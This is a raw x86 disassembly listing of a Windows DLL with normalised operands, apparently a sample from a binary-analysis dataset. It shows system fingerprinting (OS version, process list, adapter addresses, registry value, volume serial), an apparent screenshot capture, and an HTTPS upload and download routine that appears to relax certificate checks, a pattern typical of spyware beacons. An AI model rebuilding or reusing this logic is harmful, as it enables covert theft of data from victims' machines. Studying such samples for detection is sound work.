and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
mov esi ecx
push eax
push [ esi + 0x4 ]
call GdipCloneImage
test eax eax
je r-xdata
push 0x10
call GdipAlloc
test eax eax
je r-xdata
mov [ esi + 0x8 ] eax
xor eax eax
mov edx [ esi + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
jmp r-xdata
pop esi
mov esp ebp
pop ebp
retn
sub_10003ff9
push ebp
mov ebp esp
push 0x10
call GdipAlloc
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
mov ecx eax
push [ ebp + 0x8 ]
call sub_10003f4a
pop ebp
retn
sub_1000401a
push ebp
mov ebp esp
sub esp 0x10
push ebx
lea eax [ ebp - 0x8 ]
xor ebx ebx
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
mov [ ebp - 0x8 ] ebx
call GdipGetImageEncodersSize
mov eax [ ebp - 0x8 ]
test eax eax
jne r-xdata
push edi
xor ecx ecx
push 0x4c
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003f3c
mov edi eax
mov [ ebp - 0x10 ] edi
pop ecx
test edi edi
jne r-xdata
xor al al
jmp r-xdata
push esi
push edi
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
call GdipGetImageEncoders
mov esi ebx
cmp [ ebp - 0x4 ] ebx
jbe r-xdata
xor al al
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push edi
call j_sub_10003f1b
pop ecx
mov al bl
pop esi
lea eax [ edi + 0x30 ]
mov [ ebp - 0xc ] eax
pop edi
imul esi esi 0x4c
mov bl 0x1
add esi edi
mov edi [ ebp + 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
inc esi
add eax 0x4c
mov [ ebp - 0xc ] eax
cmp esi [ ebp - 0x4 ]
jb r-xdata
push [ ebp + 0x8 ]
push [ eax ]
call sub_1000335b
pop ecx
pop ecx
test eax eax
je r-xdata
jmp r-xdata
sub_100040c0
push ebp
mov ebp esp
sub esp 0x11c
push esi
xor esi esi
mov [ ebp - 0x11c ] 0x11c
push 0x100
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x118 ] esi
push esi
push eax
mov [ ebp - 0x114 ] esi
mov [ ebp - 0x110 ] esi
mov [ ebp - 0x10c ] esi
call sub_10003296
add esp 0xc
mov [ ebp - 0x4 ] esi
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x3
push 0x20
push 0x3
push 0x1
push 0x3
push 0x2
push esi
push esi
mov esi [ VerSetConditionMask@IAT ]
call esi
push edx
push eax
call esi
push edx
push eax
call esi
movzx ecx [ ebp + 0x8 ]
push edx
mov [ ebp - 0x118 ] ecx
movzx ecx [ ebp + 0xc ]
push eax
mov [ ebp - 0x114 ] ecx
lea eax [ ebp - 0x11c ]
mov cx [ ebp + 0x10 ]
push 0x23
push eax
mov [ ebp - 0x8 ] cx
call [ VerifyVersionInfoW@IAT ]
neg eax
pop esi
sbb eax eax
neg eax
mov esp ebp
pop ebp
retn
sub_10004161
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ IsWow64Process@IAT ]
cmp [ ebp - 0x4 ] 0x0
mov al 0x20
push 0x40
movzx eax al
pop ecx
cmovne eax ecx
mov esp ebp
pop ebp
retn
sub_1000418d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
push r--data
push 0x0
call sub_10003737
push [ ebp - 0x4 ]
call sub_10003f3c
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
call sub_10003737
add esp 0x1c
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_100041c6
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
xor edi edi
lea eax [ ebp - 0x8 ]
push eax
push edi
push edi
push edi
push edi
mov [ ebp - 0x8 ] edi
call GetAdaptersAddresses
mov eax [ ebp - 0x8 ]
xor ecx ecx
mov edx 0x178
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003f3c
pop ecx
mov esi eax
lea eax [ ebp - 0x8 ]
push eax
push esi
push edi
push edi
push edi
mov [ ebp - 0x18 ] esi
call GetAdaptersAddresses
push r--data
mov [ ebp - 0x4 ] edi
call [ lstrlenW@IAT ]
mov [ ebp - 0x14 ] eax
mov ebx esi
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
push 0x2
add eax 0x2
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003f3c
mov ebx esi
pop ecx
mov ecx eax
mov [ ebp - 0x4 ] ecx
test esi esi
je r-xdata
push [ ebx + 0x28 ]
call [ lstrlenW@IAT ]
push [ ebx + 0x24 ]
mov esi eax
call [ lstrlenW@IAT ]
imul ecx [ ebx + 0x34 ] 0x3
add eax esi
mov esi [ ebp - 0x14 ]
inc edi
mov ebx [ ebx + 0x8 ]
lea ecx [ ecx + esi * 2 ]
add ecx eax
add edi ecx
test ebx ebx
jne r-xdata
push ecx
call sub_10002fb7
push [ ebp - 0x4 ]
mov esi eax
call j_sub_10003f1b
push [ ebp - 0x18 ]
call j_sub_10003f1b
add esp 0xc
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x25
pop esi
push 0x20
pop eax
push 0x32
pop edx
mov [ ebp - 0xc ] 0x2e
mov [ ebp - 0x10 ] 0x78
mov esi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] edi
xor edi edi
push r--data
lea eax [ esi + edi * 2 ]
push r--data
push eax
call [ wsprintfW@IAT ]
mov ebx [ ebx + 0x8 ]
add esp 0xc
mov ecx [ ebp - 0x4 ]
add edi eax
push 0x20
pop eax
push 0x25
pop esi
push 0x32
pop edx
test ebx ebx
jne r-xdata
movzx eax [ ebx + eax + 0x2c ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ esi + edi * 2 ]
push eax
call [ wsprintfW@IAT ]
add edi eax
add esp 0xc
mov eax [ ebp - 0x14 ]
inc eax
mov [ ebp - 0x14 ] eax
cmp eax [ ebx + 0x34 ]
jb r-xdata
push 0x73
pop edx
push 0x2d
mov [ ebp - 0x46 ] dx
pop edx
push 0x73
mov [ ebp - 0x44 ] ax
mov [ ebp - 0x40 ] ax
mov [ ebp - 0x3a ] ax
mov [ ebp - 0x36 ] ax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x42 ] dx
pop edx
push 0x2d
mov [ ebp - 0x30 ] ax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x2c ] ax
xor eax eax
mov [ ebp - 0x3c ] dx
pop edx
push 0x32
mov [ ebp - 0x2a ] ax
movzx eax [ ebx + 0x2c ]
mov [ ebp - 0x38 ] dx
pop edx
push eax
push [ ebx + 0x24 ]
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x48 ] si
push [ ebx + 0x28 ]
mov [ ebp - 0x3e ] si
push eax
lea eax [ ecx + edi * 2 ]
mov [ ebp - 0x34 ] si
push eax
mov [ ebp - 0x32 ] dx
mov [ ebp - 0x2e ] dx
call [ wsprintfW@IAT ]
mov ecx [ ebp - 0xc ]
add esp 0x14
add edi eax
mov [ ebp - 0x26 ] si
mov esi [ ebp - 0x4 ]
mov [ ebp - 0x22 ] cx
push 0x3a
pop eax
mov [ ebp - 0x28 ] ax
push 0x32
pop eax
mov [ ebp - 0x24 ] ax
mov [ ebp - 0x20 ] ax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x1e ] ax
xor eax eax
mov [ ebp - 0x1c ] ax
inc eax
cmp [ ebx + 0x34 ] 0x1
mov [ ebp - 0x14 ] eax
jbe r-xdata
sub_100043be
push ebp
mov ebp esp
sub esp 0xc0
push ebx
push 0x98
lea eax [ ebp - 0x98 ]
push 0x0
push eax
call sub_10003296
add esp 0xc
mov [ ebp - 0x9c ] 0x9c
lea eax [ ebp - 0x9c ]
push eax
call [ GetVersionExA@IAT ]
lea eax [ ebp - 0xc0 ]
push eax
call [ GetSystemInfo@IAT ]
mov eax [ ebp - 0x98 ]
xor ecx ecx
mov bl cl
sub eax 0x5
je r-xdata
mov eax [ ebp - 0x94 ]
sub eax ecx
je r-xdata
sub eax 0x1
je r-xdata
mov bl 0x1
sub eax 0x1
je r-xdata
cmp [ ebp - 0x2 ] 0x1
mov eax [ ebp - 0x94 ]
jne r-xdata
sub eax 0x4
jne r-xdata
mov bl 0x2
jmp r-xdata
sub eax 0x1
jne r-xdata
sub eax ecx
je r-xdata
sub eax ecx
je r-xdata
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x2 ] 0x1
sete bl
add bl 0xf
jmp r-xdata
cmp [ ebp - 0x2 ] 0x1
jne r-xdata
mov bl 0xb
jmp r-xdata
sub eax 0x1
je r-xdata
mov bl 0x7
jmp r-xdata
sub eax 0x1
je r-xdata
test [ ebp - 0x4 ] 0x8000
je r-xdata
cmp [ ebp - 0xc0 ] 0x9
jne r-xdata
mov bl 0xc
jmp r-xdata
sub eax 0x1
je r-xdata
mov bl 0x8
jmp r-xdata
sub eax 0x1
je r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
jne r-xdata
mov bl 0x4
jmp r-xdata
mov bl 0x3
jmp r-xdata
mov bl 0xd
jmp r-xdata
sub eax 0x1
jne r-xdata
push ecx
push 0x3
push 0x6
mov bl 0x9
call sub_100040c0
add esp 0xc
test al al
je r-xdata
sub eax 0x1
jne r-xdata
push 0x59
call [ GetSystemMetrics@IAT ]
test eax eax
je r-xdata
mov bl 0x5
jmp r-xdata
mov bl 0xe
jmp r-xdata
mov bl 0xa
jmp r-xdata
jmp r-xdata
mov bl 0x6
jmp r-xdata
sub_10004505
push ebp
mov ebp esp
sub esp 0x128
push ebx
push esi
push edi
xor edi edi
push edi
push 0x2
call CreateToolhelp32Snapshot
mov esi eax
mov [ ebp - 0x128 ] 0x128
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32First
mov ebx edi
lea eax [ ebp - 0x104 ]
push eax
call sub_10002d28
inc eax
pop ecx
add ebx eax
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32Next
test eax eax
jne r-xdata
lea eax [ ebx + 0x1 ]
push eax
call sub_10003f3c
pop ecx
mov ebx eax
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32First
lea eax [ ebp - 0x104 ]
push eax
lea eax [ ebx + edi ]
push r--data
push eax
call [ wsprintfA@IAT ]
add esp 0xc
add edi eax
lea eax [ ebp - 0x128 ]
push eax
push esi
call Process32Next
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_100045ac
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push 0x2b
push r--data
call sub_100030d1
pop ecx
pop ecx
mov esi eax
xor ebx ebx
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push ebx
push esi
push 0x80000002
call [ RegOpenKeyExA@IAT ]
push esi
call j_sub_10003f1b
pop ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] ebx
push eax
push ebx
push ebx
push ebx
mov ebx r--data
push ebx
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x4 ]
call sub_10003f3c
pop ecx
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
push 0x0
push ebx
push [ ebp - 0x8 ]
call [ RegQueryValueExA@IAT ]
push [ ebp - 0x8 ]
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10004627
push ebp
mov ebp esp
push ecx
xor ecx ecx
lea eax [ ebp - 0x4 ]
push ecx
push ecx
push ecx
push ecx
push eax
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] ecx
call [ GetVolumeInformationW@IAT ]
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_10004648
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
xor edi edi
xor ebx ebx
push edi
inc ebx
push ebx
push 0x45
push 0x2c
call sub_1000381d
add esp 0x10
push 0x3e8
call [ Sleep@IAT ]
push edi
push 0x3
push 0x45
push 0x2c
call sub_1000381d
push edi
call sub_100037ad
push 0x2
call sub_1000356e
add esp 0x18
mov esi eax
call sub_10003399
test esi esi
jne r-xdata
push edi
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ebx
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] edi
push eax
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x14 ] edi
call GdiplusStartup
lea eax [ ebp - 0x30 ]
push eax
push r--data
call sub_1000401a
pop ecx
pop ecx
test al al
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x8 ]
call GdiplusShutdown
mov eax edi
push edi
push esi
call sub_10003ff9
mov ebx eax
mov [ ebp - 0x4 ] edi
lea eax [ ebp - 0x4 ]
push eax
push 0x1
push edi
call sub_10003491
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
push edi
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x4 ]
push [ ebx + 0x4 ]
call GdipSaveImageToStream
test eax eax
je r-xdata
mov eax [ ebx ]
mov ecx ebx
push 0x1
call [ eax ]
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x4 ]
call sub_100036c4
mov eax [ ebp + 0x8 ]
mov esi [ ebp - 0x10 ]
push [ ebp - 0x4 ]
mov [ eax ] esi
call sub_10003654
push esi
call sub_10003f3c
mov edi eax
push esi
push edi
push [ ebp - 0x4 ]
call sub_100035de
mov ecx [ ebp - 0x4 ]
add esp 0x1c
mov edx [ ecx ]
push ecx
call [ edx + 0x8 ]
mov [ ebx + 0x8 ] eax
sub_10004758
push ebx
push esi
push 0x4
mov esi ecx
call sub_10003f04
xor ebx ebx
pop ecx
test eax eax
je r-xdata
mov eax ebx
mov ecx eax
call sub_10003d80
jmp r-xdata
push 0x14
mov [ esi ] eax
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
call sub_10003f3c
pop ecx
mov [ esi + 0x18 ] eax
mov eax esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bx
mov [ esi + 0x22 ] bl
pop esi
pop ebx
retn
sub_100047a0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x5
mov esi ecx
xor edi edi
pop ecx
mov ebx edi
mov [ ebp - 0x4 ] ecx
add ebx 0x4
sub ecx 0x1
mov [ ebp - 0x4 ] ecx
jne r-xdata
mov eax [ edx ]
mov ecx edx
push 0x1
call [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ esi + 0x18 ]
mov edx [ ebx + eax ]
test edx edx
je r-xdata
push [ esi + 0x8 ]
call j_sub_10003f1b
push [ esi + 0x18 ]
call j_sub_10003f1b
push [ esi + 0x4 ]
call j_sub_10003f1b
add esp 0xc
cmp [ esi + 0x10 ] edi
jbe r-xdata
push [ esi + 0xc ]
call j_sub_10003f1b
mov esi [ esi ]
pop ecx
test esi esi
je r-xdata
mov eax [ esi + 0xc ]
push [ eax + edi * 4 ]
call j_sub_10003f1b
inc edi
pop ecx
cmp edi [ esi + 0x10 ]
jb r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_10003d8c
push esi
call sub_10003f1b
pop ecx
sub_10004829
push esi
push edi
mov edi ecx
xor esi esi
pop edi
pop esi
retn
call sub_100067ec
inc esi
cmp si 0x5
jb r-xdata
mov eax [ edi + 0x18 ]
movzx edx si
mov ecx [ eax + edx * 4 ]
test ecx ecx
je r-xdata
sub_1000484b
push ebp
mov ebp esp
push esi
mov esi [ InternetCloseHandle@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push [ edi + 0x8 ]
call esi
push [ edi + 0x4 ]
call esi
push [ edi ]
call esi
pop edi
pop esi
pop ebp
retn
sub_1000486b
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi ecx
xor ebx ebx
mov [ ebp - 0x18 ] edi
call sub_100053c4
push 0x3
pop esi
push ebx
push ebx
test eax eax
mov edx ebx
push eax
cmovne edx esi
push edx
push [ edi + 0x4 ]
call [ InternetOpenA@IAT ]
push ebx
push ebx
push esi
push ebx
push ebx
push 0x1bb
push [ edi + 0x8 ]
mov [ ebp - 0x1c ] eax
push eax
call [ InternetConnectA@IAT ]
mov esi eax
mov ecx edi
mov [ ebp - 0x10 ] esi
call sub_10005422
mov ecx edi
mov [ ebp - 0x8 ] eax
call sub_10005414
mov ecx [ ebp - 0x8 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_10005001
push 0x4
push r--data
mov edi eax
call sub_100030d1
pop ecx
pop ecx
push ebx
push 0x800000
push ebx
push ebx
push ebx
push edi
mov esi eax
push esi
push [ ebp - 0x10 ]
call [ HttpOpenRequestA@IAT ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
push ecx
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x14 ] 0x4
push ecx
push 0x1f
push eax
call [ InternetQueryOptionA@IAT ]
or [ ebp - 0x4 ] 0x3180
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push 0x1f
push [ ebp - 0x8 ]
call [ InternetSetOptionA@IAT ]
push esi
call j_sub_10003f1b
push edi
call j_sub_10003f1b
push [ ebp + 0xc ]
call sub_10002d28
mov esi [ ebp - 0x8 ]
add esp 0xc
push eax
push [ ebp + 0xc ]
push ebx
push ebx
push esi
call [ HttpSendRequestA@IAT ]
mov [ ebp - 0xc ] ebx
test eax eax
je r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
pop edi
mov [ ecx + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ ecx + 0x8 ] esi
mov [ ecx ] eax
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x18 ]
push ebx
mov [ ebp + 0xc ] 0x4
mov [ eax + 0x22 ] 0x1
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0xc ]
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov ebx [ ebp - 0xc ]
push eax
push ecx
push esi
call sub_10004dd9
add esp 0xc
sub_100049aa
push ebp
mov ebp esp
sub esp 0x74
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x3c ] esi
call sub_100043be
mov [ ebp - 0x1 ] al
call sub_10004161
mov [ ebp - 0x2 ] al
call sub_10004505
push eax
mov [ ebp - 0x58 ] eax
call sub_10002d28
mov [ ebp - 0x68 ] eax
call sub_100041c6
push eax
mov [ ebp - 0x54 ] eax
call sub_10002d28
mov edi eax
mov [ ebp - 0x60 ] edi
call sub_100045ac
push eax
mov [ ebp - 0x50 ] eax
call sub_10002d28
add esp 0xc
mov [ ebp - 0x34 ] eax
mov ecx esi
call sub_100053c4
push eax
mov [ ebp - 0x6c ] eax
call sub_10002d28
pop ecx
mov ebx eax
mov ecx esi
mov [ ebp - 0x20 ] ebx
call sub_10005422
push eax
mov [ ebp - 0x70 ] eax
call sub_10002d28
pop ecx
mov ecx esi
mov [ ebp - 0x8 ] eax
call sub_10005414
push eax
mov [ ebp - 0x74 ] eax
call sub_10002d28
mov esi eax
mov [ esp ] r--data
mov [ ebp - 0x24 ] esi
call sub_10002d28
add eax esi
add eax [ ebp - 0x8 ]
add eax ebx
push 0x5
push r--data
mov [ ebp - 0x64 ] eax
call sub_100030d1
push eax
mov [ ebp - 0x4c ] eax
call sub_10002d28
push 0x6
push r--data
mov [ ebp - 0x30 ] eax
call sub_100030d1
push eax
mov [ ebp - 0x48 ] eax
call sub_10002d28
push 0xa
push r--data
mov [ ebp - 0x18 ] eax
call sub_100030d1
push eax
mov [ ebp - 0x44 ] eax
call sub_10002d28
push 0x6
push r--data
mov [ ebp - 0x1c ] eax
call sub_100030d1
push eax
mov [ ebp - 0x40 ] eax
call sub_10002d28
mov esi eax
xor ebx ebx
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x38 ] esi
push eax
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x14 ] ebx
call sub_10004648
mov ecx eax
mov [ ebp - 0xc ] ebx
add esp 0x38
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x10 ] ebx
mov eax ebx
mov [ ebp - 0x28 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x64 ]
add ecx eax
add ecx ebx
add ecx esi
mov esi [ ebp - 0x68 ]
add ecx [ ebp - 0x1c ]
add ecx [ ebp - 0x18 ]
add ecx [ ebp - 0x30 ]
add ecx [ ebp - 0x34 ]
lea eax [ esi + 0x8 ]
add ecx edi
add eax ecx
push eax
call sub_10003f3c
mov ebx eax
lea eax [ ebp - 0x1 ]
push 0x1
push eax
push ebx
call sub_10003271
push 0x1
lea eax [ ebp - 0x2 ]
push eax
lea eax [ ebx + 0x1 ]
push eax
call sub_10003271
push esi
push [ ebp - 0x58 ]
lea eax [ ebx + 0x2 ]
push eax
call sub_10003271
mov eax [ ebp - 0x54 ]
add esp 0x28
add esi 0x2
test eax eax
je r-xdata
cmp [ ebp - 0x14 ] eax
jbe r-xdata
mov edi [ ebp - 0x30 ]
lea eax [ esi + ebx ]
push edi
push [ ebp - 0x4c ]
push eax
call sub_10003271
add esi edi
mov edi [ ebp - 0x34 ]
push edi
push [ ebp - 0x50 ]
lea eax [ esi + ebx ]
push eax
call sub_10003271
add esp 0x18
add esi edi
mov edi [ lstrlenA@IAT ]
push r--data
call edi
push eax
lea eax [ esi + ebx ]
push r--data
push eax
call sub_10003271
add esp 0xc
push r--data
call edi
push [ ebp - 0x18 ]
add esi eax
push [ ebp - 0x48 ]
lea eax [ esi + ebx ]
push eax
call sub_10003271
add esi [ ebp - 0x18 ]
push [ ebp - 0x1c ]
push [ ebp - 0x44 ]
lea eax [ esi + ebx ]
push eax
call sub_10003271
mov eax [ ebp - 0x3c ]
add esp 0x18
add esi [ ebp - 0x1c ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
test edi edi
jle r-xdata
push [ ebp - 0x14 ]
push ecx
call sub_10002f22
mov edi eax
push edi
mov [ ebp - 0xc ] edi
call sub_10002d28
push [ ebp - 0x5c ]
mov ebx eax
mov [ ebp - 0x2c ] ebx
call j_sub_10003f1b
push 0x4
push r--data
call sub_100030d1
mov edi eax
push edi
mov [ ebp - 0x10 ] edi
call sub_10002d28
mov edi [ ebp - 0x60 ]
add esp 0x1c
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x20 ] 0x0
jle r-xdata
push r--data
call edi
push eax
lea eax [ esi + ebx ]
push r--data
push eax
call sub_10003271
add esp 0xc
push r--data
call edi
push [ ebp - 0x38 ]
add esi eax
push [ ebp - 0x40 ]
lea eax [ esi + ebx ]
push eax
call sub_10003271
add esp 0xc
add esi [ ebp - 0x38 ]
push edi
push eax
lea eax [ esi + ebx ]
push eax
call sub_10003271
add esp 0xc
add esi edi
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
push r--data
call edi
push eax
lea eax [ esi + ebx ]
push r--data
push eax
call sub_10003271
add esp 0xc
push r--data
call edi
push [ ebp - 0x20 ]
add esi eax
push [ ebp - 0x6c ]
lea eax [ esi + ebx ]
push eax
call sub_10003271
add esp 0xc
add esi [ ebp - 0x20 ]
cmp [ ebp - 0x24 ] 0x0
jle r-xdata
push r--data
call edi
push eax
lea eax [ esi + ebx ]
push r--data
push eax
call sub_10003271
add esp 0xc
push r--data
call edi
push [ ebp - 0x8 ]
add esi eax
push [ ebp - 0x70 ]
lea eax [ esi + ebx ]
push eax
call sub_10003271
add esp 0xc
add esi [ ebp - 0x8 ]
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push r--data
call edi
push eax
lea eax [ esi + ebx ]
push r--data
push eax
call sub_10003271
add esp 0xc
push r--data
call edi
push [ ebp - 0x24 ]
add esi eax
push [ ebp - 0x74 ]
lea eax [ esi + ebx ]
push eax
call sub_10003271
add esp 0xc
add esi [ ebp - 0x24 ]
push 0x1
push r--data
call sub_100030d1
pop ecx
pop ecx
mov ecx [ ebp - 0x3c ]
mov esi eax
push ebx
push esi
call sub_10005880
push [ ebp - 0xc ]
mov edi eax
call j_sub_10003f1b
push [ ebp - 0x10 ]
call j_sub_10003f1b
push [ ebp - 0x40 ]
call j_sub_10003f1b
push esi
call j_sub_10003f1b
push ebx
call j_sub_10003f1b
push [ ebp - 0x44 ]
call j_sub_10003f1b
push [ ebp - 0x48 ]
call j_sub_10003f1b
push [ ebp - 0x4c ]
call j_sub_10003f1b
push [ ebp - 0x50 ]
call j_sub_10003f1b
push [ ebp - 0x54 ]
call j_sub_10003f1b
push [ ebp - 0x58 ]
call j_sub_10003f1b
add esp 0x2c
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x28 ] 0x0
jle r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x2c ] 0x0
jle r-xdata
push r--data
call edi
push eax
lea eax [ esi + ebx ]
push r--data
push eax
call sub_10003271
add esp 0xc
push r--data
call edi
mov edi [ ebp - 0x28 ]
add esi eax
push edi
push [ ebp - 0x10 ]
add esi ebx
push esi
call sub_10003271
push [ ebp - 0x2c ]
lea eax [ esi + edi ]
push [ ebp - 0xc ]
push eax
call sub_10003271
add esp 0x18
sub_10004dd9
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
call [ lstrlenA@IAT ]
push [ ebp + 0x10 ]
lea esi [ eax + 0x1 ]
call sub_10002d28
pop ecx
push esi
push [ ebp + 0xc ]
mov esi [ InternetSetOptionA@IAT ]
lea edi [ eax + 0x1 ]
push 0x2b
push [ ebp + 0x8 ]
call esi
push edi
push [ ebp + 0x10 ]
push 0x2c
push [ ebp + 0x8 ]
call esi
pop edi
pop esi
pop ebp
retn
sub_10004e16
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
push edi
xor edi edi
mov esi ecx
mov [ ebp - 0x10 ] edi
mov [ ebp - 0xc ] edi
call sub_100053c4
push 0x3
pop ebx
push edi
push edi
test eax eax
mov ecx edi
push eax
cmovne ecx ebx
push ecx
push [ esi + 0x4 ]
call [ InternetOpenA@IAT ]
push edi
push edi
push ebx
push edi
push edi
push 0x1bb
push [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
push eax
call [ InternetConnectA@IAT ]
mov ecx esi
mov ebx eax
call sub_10005422
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10005414
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
push edi
push 0x800000
push edi
push edi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push ebx
call [ HttpOpenRequestA@IAT ]
mov esi eax
push esi
call sub_10001d56
pop ecx
push [ ebp + 0x10 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x10 ]
push edi
push edi
push esi
call [ HttpSendRequestA@IAT ]
mov ecx edi
mov [ ebp - 0x4 ] ecx
test eax eax
je r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] esi
cmp ecx 0xc8
jne r-xdata
push edi
lea eax [ ebp + 0x10 ]
mov [ ebp + 0x10 ] 0x4
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov ecx [ ebp - 0x4 ]
push eax
push ecx
push ebx
call sub_10004dd9
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
call sub_1000484b
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
push 0x10000
mov ebx edi
mov [ ebp + 0x10 ] edi
call sub_1000295a
pop ecx
mov [ ebp + 0x8 ] eax
jmp r-xdata
lea ecx [ ebp + 0x10 ]
push ecx
push 0x10000
push eax
push esi
call [ InternetReadFile@IAT ]
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x18 ]
push [ ebp + 0x8 ]
mov [ eax ] ebx
call sub_10002a8f
pop ecx
add eax ebx
push eax
push edi
call sub_10002aad
push [ ebp + 0x10 ]
mov edi eax
push [ ebp + 0x8 ]
lea ecx [ ebx + edi ]
push ecx
call sub_10003271
add ebx [ ebp + 0x10 ]
add esp 0x14
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
sub_10004f6f
push ebp
mov ebp esp
sub esp 0x30
mov eax [ ebp + 0x1c ]
push ebx
push esi
push edi
and [ eax ] 0x0
mov edi ecx
mov [ ebp - 0x4 ] edi
call sub_100053c4
mov ecx edi
mov esi eax
call sub_10005422
mov ecx edi
mov ebx eax
call sub_10005414
mov edx eax
lea edi [ ebp - 0x2c ]
push 0x3
pop ecx
push 0x0
pop eax
test esi esi
push 0x9
cmovne eax ecx
mov [ ebp - 0x8 ] eax
xor eax eax
pop ecx
[ edi ]
mov eax [ ebp - 0x4 ]
push [ ebp + 0x1c ]
